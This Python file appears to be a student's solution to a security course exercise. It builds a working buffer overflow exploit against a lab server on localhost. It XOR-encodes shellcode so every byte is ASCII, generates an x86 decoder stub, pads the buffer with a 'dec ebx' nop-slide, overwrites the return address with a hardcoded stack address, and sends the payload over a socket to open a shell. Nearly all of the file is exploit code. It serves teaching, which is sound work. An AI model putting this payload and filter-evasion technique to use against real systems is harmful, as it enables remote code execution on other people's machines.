import functools
import os
import socket
import traceback
import q2

from infosec.core import assemble, smoke
from typing import Tuple, Iterable


HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337


ASCII_MAX = 0x7f

def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)

    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(c > ASCII_MAX for c in selector(ret)):
                smoke.warning(f'Non ASCII chars in return value from '
                              f'{func.__name__} at '
                              f'{"".join(traceback.format_stack()[:-1])}')
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda result: result[0])
def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
    """Encode the given data to be valid ASCII.

    As we recommended in the exercise, the easiest way would be to XOR
    non-ASCII bytes with 0xff, and have this function return the encoded data
    and the indices that were XOR-ed.

    Tips:
    1. To return multiple values, do `return a, b`

    Args:
        data - The data to encode

    Returns:
        A tuple of [the encoded data, the indices that need decoding]
    """
    # converting the data into a list, so we can modify it
    data= list(data)
    #this will be the indices we changed
    xored_bytes_indices =list()
    for i in range(len(data)):
        #checking if we need to change this byte
        if data[i]>ASCII_MAX:
            #if we got here, then we want to xor this byte with x\ff so it will be a vallid ascii char
            data[i]=data[i] ^ 0xff
            #we just changed a byte, so we'll add its indix to the list 
            xored_bytes_indices.append(i)
    #convert the data back to bytes, and return it and the indices list
    return (bytes(data),xored_bytes_indices)
    
   


@warn_invalid_ascii()
def get_decoder_code(indices: Iterable[int]) -> bytes:
    """This function returns the machine code (bytes) of the decoder code.

    In this question, the "decoder code" should be the code which decodes the
    encoded shellcode so that we can properly execute it. Assume you already
    have the address of the shellcode, and all you need to do here is to do the
    decoding.

    Args:
        indices - The indices of the shellcode that need the decoding (as
        returned from `encode`)

    Returns:
         The decoder coder (assembled, as bytes)
    """
    #put the value x\ff in bl. this is done by : ebx<-0, and the dec ebx which will cause an underflow, so ebx will be 0xffffffff
    decoder= assemble.assemble_data("push 0x0\n pop ebx\n dec ebx")
    indices.sort()
    #this will indicate to us if we moved eax, and if so, how many times (need to be done if an index is greater then 0x79. otherwise it wasnt ascii)
    eax_count=0
    for i in indices:
        #this part handle the case the index making us change an address which is greater then eax+0x7f
        while i>(0x80*eax_count+0x7f):
            #if we got here, the address we need indeed greater then eax+0x79. we'll add to eax 0x80, by: "add eax, 0X7f, and then add eax, 1"
            decoder+= b"\x05\x7F\x00\x00\x00\x05\x01\x00\x00\x00"    
            #incrementing the eax coung by one, idicatinf that eax is now eax+80
            eax_count+=1
        #when we are getting here, eax is in the place we want (no more then 0x7f bytes before the address we want to change)
        j=i%0x80
        #xor the data to get it decoded back to normal
        decoder+= assemble.assemble_data(f"xor byte ptr [eax + {j}], bl")
    return decoder
    

@warn_invalid_ascii()
def get_ascii_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    In this question, the "shellcode" should be the code which if we put EIP to
    point at, it will open the shell. Since we need this shellcode to be
    entirely valid ASCII, the "shellcode" is made of the following:

    - The instructions needed to find the address of the encoded shellcode
    - The encoded shellcode, which is just the shellcode from q2 after encoding
      it using the `encode()` function we defined above
    - The decoder code needed to extract the encoded shellcode

    As before, this does not include the size of the message sent to the server,
    the return address we override, the nop slide or anything else!

    Tips:
    1. This function is for your convenience, and will not be tested directly.
       Feel free to modify it's parameters as needed.
    2. Use the `assemble` module to translate any additional instructions into
       bytes.

    Returns:
         The bytes of the shellcode.
    """
    q2_shellcode = get_raw_shellcode()
    x=encode(q2_shellcode)
    #in assembly: push esp, pop eax, sub eax 0x7f, sub eax 0x2b. this will set eax to point to the start of our encoded shellcode
    set_eax= b"\x54\x58\x2d\x7f\x00\x00\x00\x2d\x2b\x00\x00\x00"
    #creating the decoder code
    decoder_code=get_decoder_code(x[1])
    encoded_shellcode=x[0]
    return set_eax+decoder_code+encoded_shellcode


@warn_invalid_ascii(lambda payload: payload[4:-5])
def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    #dec ebx wont bother us, so we will use it as a nop slide 
    nop_equivelant=assemble.assemble_data("dec ebx")
    return_address= b'\xac\xdc\xff\xbf'
    ascii_shellcode= get_ascii_shellcode()
    #this is the distance between the address we want to override to the start of the buffer
    size_of_buf= 1040
    #putting "nop" slide in the start of our buffer
    nop_padding = nop_equivelant * (size_of_buf-len(ascii_shellcode))
    msg= nop_padding + ascii_shellcode + return_address + b'\x00'
    size_of_msg = b'\x00\x00\x04\x15' 
    return size_of_msg + msg

def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
